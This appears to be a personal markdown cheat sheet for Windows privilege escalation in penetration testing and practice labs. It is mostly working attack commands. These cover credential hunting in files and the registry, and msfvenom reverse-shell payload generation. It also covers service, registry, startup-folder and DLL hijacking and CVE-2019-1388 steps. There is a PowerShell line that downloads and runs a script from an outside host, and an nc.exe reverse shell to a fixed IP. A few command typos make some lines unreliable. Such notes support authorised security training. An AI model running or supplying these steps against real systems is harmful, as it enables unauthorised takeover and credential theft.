# Windows Privilege Escalation

## Foothold

## Initial Enumeration
### System Enumeration
* Systeminfo
```cmd
systeminfo
```
* Using the pipe (|) as grep
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
* Enumerating Patching Level
> wmic must be installed for this to work. Not installed by default on Win10/11
```cmd
wmic qfe get Caption,Description,HotFixID,Installation
```

### User Enumeration
* Who am I?
```cmd
whoami
```
* What are my privileges?
```cmd
whoami /priv
```
* What groups am I in?
```cmd
whoami /groups
```
* What users are on this machine?
```cmd
net user
```
* What info can I get about a specific user?
```cmd
net user [user]
```
* What are the local groups?
```cmd
net localgroup
```
* Who's in what group?
```cmd
net localgroup [group]
```

### Network Enumeration
* Get the entire network config
```cmd
ipconfig /all
```
* Find our computer neighbors
```cmd
arp -a
```
* View the routing table
```cmd
route print
```
* What ports and services are running?
```cmd
netstat -ano
```

### Password Hunting
* Basic Password Hunting with findstr
```cmd
findstr /si [search term] [file extensions]

# Example
findstr /si password *.txt *.ini *.config
```
* Wifi passwords
```cmd
# Find the profile
netsh wlan show profile

# Show the passwords
netsh wlan show provile [SSID] key=clear
```

### AV Enumeration
* Windows Defender
```cmd
sc query windefund
```
* All the services on the machine (Look for AV)
```cmd
sc queryex type= service
```
* Firewall Settings
```cmd
netsh advfirewall firewall dump
# or
netsh firewall show state
```
* Show firewall configuration
```cmd
netsh firewall show config
```

## Automated Tools
* [WinPEAS](https://github.com/peass-ng/PEASS-ng)

* [Windows PrivEsc Checklist](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)

* [Seatbelt](https://github.com/GhostPack/Seatbelt)

* [WES-NG(Windows Exploit Suggester)](https://github.com/bitsadmin/wesng)

## Kernel Exploits
* [Big list of kernel exploits - Has not been updated in a while](https://github.com/SecWiki/windows-kernel-exploits)
* usually just upload and execute. 
* can be found using the exploit suggest in MSF (post/multi/recon/local_exploit_suggester)

## Passwords and Port Forwarding
* Search for cleartext passwords
```cmd
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```
* Common files containing passwords
```cmd
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
* Common Registry keys containing passwords
```cmd
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
## WSL
### Resources
* HTB Practice Box - SECnotes
* [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop---windows-subsystem-for-linux-wsl)

## Impersonation and Potato Attacks
### Resources
* [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges)
* [Hacktricks Article](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html)
* [FoxGloveSecurity](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [Potato Breakdown by gtworek](https://github.com/gtworek/Priv2Admin)
* Basically we are looking for SEImpersonate or SEAssignPrimaryToken Privilege after `whoami /priv`
* Practice Machine - HTB Jeeves

### List of potatoes
* [God Potato](https://github.com/BeichenDream/GodPotato) - Win8-8.1 through Win11 and Server 2012-2022
* [Juicy Potato](https://github.com/ohpe/juicy-potato/releases) - ver <= Win10 1809 and Windows Server 2019
* [Sigma Potato](https://github.com/tylerdotrar/SigmaPotato) - 

## GetSystem
* Metasploit command to elevate priviliges

## RUNAS
### Resources
* Practice Machine - Access (Hint: cmdkey /list)

### Execution
* Look for Stored Credentials
```cmd
cmdkey /list
```
* Execute command as user
```cmd
C:\Windows\System32\runas.exe /user:[domain\user] /savecred "C:\Windows\System32\cmd.exe /c [command to run]"
```
## Registry

### Escalation via Autorun
#### Enumeration
##### Enumeration with SysInternals
###### [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
> This actually opens a window, so is not command line only. Command line is autorunsc.exe
* List all of the autorun executables in the registry
```cmd
autoruns64.exe
```
* Check permissions on the autorun executable with [accesschk64](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
```cmd
accesschk64 -wvu "[Path to executable(.exe)"
```
###### Enumeration with PowerUP
```powershell
powershell -ep bypass

#Import PowerUp module
. .\PowerUp.ps1

# Execute All Checks (Similar to WinPEAS)
Invoke-AllCheck
```
#### Exploitation
* Generate a revshell executable
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=[attackerIP] lport=[attacker port] -f exe -o [filename].exe
```
* MSFConsole
```bash
use multi/handler
set lhost=[attacker IP]
set payload windows/meterpreter/reverse_tcp
exploit
```
* Log out and log in or login as administrative user

### Escalation via AlwaysInstallElevated
#### Enuemeration
* Check if AlwaysInstallElevated is set to 1 in both of the below keys
```cmd
reg query HKLM\Softrware\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
* PowerUP & WinPEAS will show these results

#### Exploitation
##### MSFVenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport=[attacker port] -f msi -o [filename].msi
# Setup Listener, transfer to host, execute
```
##### PowerUp
> PowerUp creates an MSI that let's you add a backdoor user and add them to any group
```cmd
# Import as above
Write-UserAddMSI
```
### via regsvc
> Allows us to create a service directly in the registy pointing to our own malicious executable, and then start that service.  

#### Enumeration
- via Powershell
```shell
# Set execution policy
powershell -ep bypass

# Get-ACL
Get-ACL -Path hklm:\System\CurrentControlSet\services\regsvc | fl

# Under Access, Look for "NT AUTHORITY\INTERACTIVE Allow FullControl
```
#### Exploitation
- Generate a payload.
```bash
# Example Reverse shell from msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe -o reverse.exe
```
- Upload the payload to a suitable directory (C:\Windows\Temp\)
- Add the registry entry for our malicious service.
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <path malicious executable> /f
```
- Start our malicious service
```bash
sc start regsvc
```
## Executables
### Enumeration
- via PowerUp.ps1
```shell
# Execution policy bypass
powershell -ep bypass

# Run PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
```
> Verify in the `Checking service executable and argument permissions...` section that a service has `ModifiableFile`, `ModifiableFilePermissions`, and `ModifiableFileIdentityReference` permissions.  

- via [accesschk64.exe]()
> accesschk64 doesn't run a scan so you have to already know the service your investigating.  
```shell
accesschk64.exe -wvu <path to executable>
```
### Exploitation
> Basically we are going to save our malicious executable over the service executable, and then start the service.

## Startup Applications
> We're going to drop a malicious application in the start menu `startup` folder so that it starts automatically.   
#### Enumeration
- Verify you have full access to the startup directory
```shell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
#### Exploitation
- Sampe msfvenom reverse meterpreter shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] -f exe -o x.exe
```
- Upload and copy the malicious exe to C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
- Fire up the multi/handler in msfconsole(for this example, set the payload to windows/meterpreter/reverse_tcp)

## DLL Hijacking
### Enumeration
- Process Monitor
Set Filters
```
Result is NAME NOT FOUND then Include
Path ends with .dll then Include
Apply & OK
# Look for dll's in writable folders (C:\Program Files, C:\Temp, etc.)
```
### Exploitation
To exploit, drop a malicious dll (either replace or supply the missing one) and restart the service

## Service Permissions
### Binary Paths
#### Enumeration
#### Accesschk64
```shell
accesschk64 - uwcv Everyone *
```
##### PowerUP.ps1
```shell
powershell -ep bypass
. .\Powerup.ps1
Invoke-AllChecks
```
- Look in the `checking service permissions...` section
#### Exploitation
##### Using binpath
```shell
sc config [svcname] binpath="[command or path to malicious executable]"
sc start [svcname]
```
### Unquoted Service Paths
The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.   

#### Enumeration
```shell
# in CMD
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
# in PowerShell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
- PowerUP
```shell
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```
- Metasploit: `exploit/windows/local/trusted_service_path`

- winPEAS
Check for unquoted services in the services section
```shell
════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    cplspcon(Intel Corporation - Intel(R) Content Protection HDCP Service)[C:\WINDOWS\System32\DriverStore\FileRepository\iigd_dch.inf_amd64_16ebc8ff2bb71c24\IntelCpHDCPSvc.exe] - Auto - Running
    Intel(R) Content Protection HDCP Service - enables communication with Content Protection HDCP HW
```
#### Exploitation
- Drop an executable with the same name as a folder that has a space in it. See example above.

#### Example

For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
* `C:\Program.exe`
* `C:\Program Files.exe`

## CVE-2019-1388
### CVE-2019-1388 Abuse UAC Windows Certificate Dialog
Description:

This CVE exploit tend to abuse the UAC windows Certificate Dialog to execute the certificate issuer link as an NT Authority User and open a browser that is under NT Authority User. Then we can use that to prompt a shell as a NT Authority User.

Steps:
```
1) find a program that can trigger the UAC prompt screen

2) select "Show more details"

3) select "Show information about the publisher's certificate"

4) click on the "Issued by" URL link it will prompt a browser interface.

5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".

6) on the explorer window address path, enter the cmd.exe full path:
C:\WINDOWS\system32\cmd.exe

7) now you'll have an escalated privileges command prompt. 
```
Video PoC: https://www.youtube.com/watch?v=RW5l6dQ8H-8

# Todo
[] Organize tools used at the top
[] Provide Download links to the tools used
